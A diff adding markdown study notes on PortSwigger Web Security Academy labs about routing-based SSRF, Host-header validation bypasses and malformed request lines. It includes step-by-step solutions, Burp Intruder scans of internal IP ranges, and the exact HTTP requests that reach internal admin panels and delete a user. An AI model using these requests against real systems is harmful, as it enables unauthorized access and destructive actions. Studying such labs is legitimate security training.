@@ -233,4 +233,155 @@ Having confirmed that you can successfully manipulate an intermediary system to 
 
 > CIDR notation
 >
-> 
+> IP address ranges are commonly expressed using CIDR notation, for example, 192.168.0.0/16. 
+
+### PRACTITIONER Lab: Routing-based SSRF
+Official lab's solution:
+- Send the GET / request that received a 200 response to Burp Repeater.
+- In Burp Repeater, select the Host header value, right-click and select Insert Collaborator payload to replace it with a Collaborator domain name. Send the request.
+- Go to the Collaborator tab and click Poll now. You should see a couple of network interactions in the table, including an HTTP request. This confirms that you are able to make the website's middleware issue requests to an arbitrary server.
+- Send the GET / request to Burp Intruder. 
+- Go to Intruder.
+- Deselect `Update Host header to match target`.
+- Delete the value of the Host header and replace it with the following IP address, adding a payload position to the final octet: `Host: 192.168.0.§0§`
+- In the Payloads side panel, select the payload type Numbers. Under Payload configuration, enter the following values:
+```
+From: 0
+To: 255
+Step: 1
+```
+- Click Start attack. A warning will inform you that the Host header does not match the specified target host. As we've done this deliberately, you can ignore this message.
+- When the attack finishes, click the Status column to sort the results. Notice that a single request received a 302 response redirecting you to `/admin`. Send this request to Burp Repeater. 
+
+p.s.: here's the request sent to burp repeater:
+```bash
+GET / HTTP/2
+Host: 192.168.0.222
+Cookie: session=Nio4QcoREi5cKseAWGrzshlJZxMdGqTm; _lab=46%7cMCwCFDi%2fgB78YJuUoUa1rjIfLSI8FwtpAhRt6kzN2SgAMn%2fW22fZBQmbEaDAFSoXsiEo6TU1f%2fYTAF0CnhE%2brRM5jfJ%2f5YJavB186ids3DvZHsZHcKj7zJoquS82Ok5xrGV1XW6jC3gX8veqXkLOyFZaiphdnw%2f58S1GsxESay8RF%2f0%3d
+```
+Now we change the url to `/admin`:
+```bash
+GET /admin HTTP/2
+Host: 192.168.0.222
+Cookie: session=Nio4QcoREi5cKseAWGrzshlJZxMdGqTm; _lab=46%7cMCwCFDi%2fgB78YJuUoUa1rjIfLSI8FwtpAhRt6kzN2SgAMn%2fW22fZBQmbEaDAFSoXsiEo6TU1f%2fYTAF0CnhE%2brRM5jfJ%2f5YJavB186ids3DvZHsZHcKj7zJoquS82Ok5xrGV1XW6jC3gX8veqXkLOyFZaiphdnw%2f58S1GsxESay8RF%2f0%3d
+```
+and in the response we see:
+```bash
+...
+                   <form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
+                        <input required type="hidden" name="csrf" value="4W4fJyPz4YDGG6QNHeDlQlDVitIInZqt">
+                        <label>Username</label>
+                        <input required type='text' name='username'>
+                        <button class='button' type='submit'>Delete user</button>
+                    </form>
+...
+```
+So we craft the req to delete carlos (csrf is copied from the form above):
+```bash
+GET /admin/delete?csrf=4W4fJyPz4YDGG6QNHeDlQlDVitIInZqt&username=carlos
+```
+
+### PRACTITIONER SSRF via flawed request parsing
+Lab description:
+This lab is vulnerable to routing-based SSRF due to its flawed parsing of the request's intended host. You can exploit this to access an insecure intranet admin panel located at an internal IP address.
+To solve the lab, access the internal admin panel located in the 192.168.0.0/24 range, then delete the user carlos. 
+
+Official lab's solution:
+- Send the GET / request that received a 200 response to Burp Repeater and study the lab's behavior. Observe that the website validates the Host header and blocks any requests in which it has been modified.
+- Observe that you can also access the home page by supplying an absolute URL in the request line as follows:
+```bash
+GET https://YOUR-LAB-ID.web-security-academy.net/
+```
+- Notice that when you do this, modifying the `Host` header no longer causes your request to be blocked. Instead, you receive a timeout error. This suggests that the absolute URL is being validated instead of the Host header.
+- Use Burp Collaborator to confirm that you can make the website's middleware issue requests to an arbitrary server in this way. For example, the following request will trigger an HTTP request to your Collaborator server:
+```bash
+GET https://YOUR-LAB-ID.web-security-academy.net/
+Host: BURP-COLLABORATOR-SUBDOMAIN
+```
+- In burp collaborator set pull and observe that the request to it has been made
+- Send the request to burp intruder (example of the req below):
+```bash
+GET https://0ac900c0044972cb80eda3cb001a00ba.web-security-academy.net HTTP/2
+Host: 0ac900c0044972cb80eda3cb001a00ba.web-security-academy.net
+```
+- Deselect `Update Host header to match target`
+- Delete the value of the Host header and replace it with the following IP address, adding a payload position to the final octet: `Host: 192.168.0.§0§`
+- In the Payloads side panel, select the payload type Numbers. Under Payload configuration, enter the following values:
+```
+From: 0
+To: 255
+Step: 1
+```
+- Click Start attack. A warning will inform you that the Host header does not match the specified target host. As we've done this deliberately, you can ignore this message.
+- When the attack finishes, click the Status column to sort the results. Notice that a single request received a 302 response redirecting you to `/admin`. Send this request to Burp Repeater. 
+- In Burp Repeater, append /admin to the absolute URL in the request line and send the request. Observe that you now have access to the admin panel, including a form for deleting users (example):
+```bash
+GET https://0ac900c0044972cb80eda3cb001a00ba.web-security-academy.net HTTP/2
+Host: 192.168.0.153
+```
+Based on the response craft the delete carlos request:
+```bash
+GET https://0ac900c0044972cb80eda3cb001a00ba.web-security-academy.net/admin/delete?csrf=0pmHH1HJYgpnj4vK37PyPy0QkE71eChA&username=carlos
+Host: 192.168.0.153
+```
+- Copy the session cookie from the Set-Cookie header in the displayed response and add it to your request.
+- Right-click on your request and select "Change request method". Burp will convert it to a POST request.
+- Send the request to delete carlos and solve the lab
+
+### Connection state attacks
+For performance reasons, many websites reuse connections for multiple request/response cycles with the same client. Poorly implemented HTTP servers sometimes work on the dangerous assumption that certain properties, such as the Host header, are identical for all HTTP/1.1 requests sent over the same connection. This may be true of requests sent by a browser, but isn't necessarily the case for a sequence of requests sent from Burp Repeater. This can lead to a number of potential issues.
+
+For example, you may occasionally encounter servers that only perform thorough validation on the first request they receive over a new connection. In this case, you can potentially bypass this validation by sending an innocent-looking initial request then following up with your malicious one down the same connection. 
+
+### PRACTITIONER Lab: Host validation bypass via connection state attack
+Lab description:
+This lab is vulnerable to routing-based SSRF via the Host header. Although the front-end server may initially appear to perform robust validation of the Host header, it makes assumptions about all requests on a connection based on the first request it receives.
+To solve the lab, exploit this behavior to access an internal admin panel located at `192.168.0.1/admin`, then delete the user carlos. 
+
+> Note:
+>
+> This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out [Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling](https://portswigger.net/research/browser-powered-desync-attacks#state). 
+
+Official lab's solution:
+- Send the GET / request to Burp Repeater.
+- Make the following adjustments:
+    - Change the path to /admin.
+    - Change Host header to 192.168.0.1.
+- Send the request. Observe that you are simply redirected to the homepage.
+- Duplicate the tab, then add both tabs to a new group.
+- Select the first tab and make the following adjustments:
+    - Change the path back to /.
+    - Change the Host header back to YOUR-LAB-ID.h1-web-security-academy.net.
+- Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection).
+- Change the Connection header to keep-alive. 
+- Send the sequence and check the responses. Observe that the second request has successfully accessed the admin panel. 
+- Study the response and observe that the admin panel contains an HTML form for deleting a given user.
+- On the second tab in your group, use these details to replicate the request that would be issued when submitting the form:
+```bash
+POST /admin/delete HTTP/1.1
+Host: 192.168.0.1
+Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE
+Content-Type: x-www-form-urlencoded
+Content-Length: CORRECT
+
+csrf=YOUR-CSRF-TOKEN&username=carlos
+```
+
+> Note:
+>
+> Many reverse proxies use the Host header to route requests to the correct back-end. If they assume that all requests on the connection are intended for the same host as the initial request, this can provide a useful vector for a number of Host header attacks, including routing-based SSRF, password reset poisoning, and cache poisoning. 
+
+### SSRF via a malformed request line
+Custom proxies sometimes fail to validate the request line properly, which can allow you to supply unusual, malformed input with unfortunate results.
+
+For example, a reverse proxy might take the path from the request line, prefix it with http://backend-server, and route the request to that upstream URL. This works fine if the path starts with a / character, but what if starts with an @ character instead?
+GET @private-intranet/example HTTP/1.1
+
+The resulting upstream URL will be http://backend-server@private-intranet/example, which most HTTP libraries interpret as a request to access private-intranet with the username backend-server.
+
+> Research:
+>
+> These techniques were also popularized by our Director of Research, James Kettle. For a more detailed description of the technique, tooling, and how he was able to exploit these vulnerabilities in the wild, check out the full whitepaper and video presentation on our Research page.
+> [Cracking the lens: targeting HTTP's hidden attack-surface](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface)
+> [PortSwigger research](https://portswigger.net/research)
+
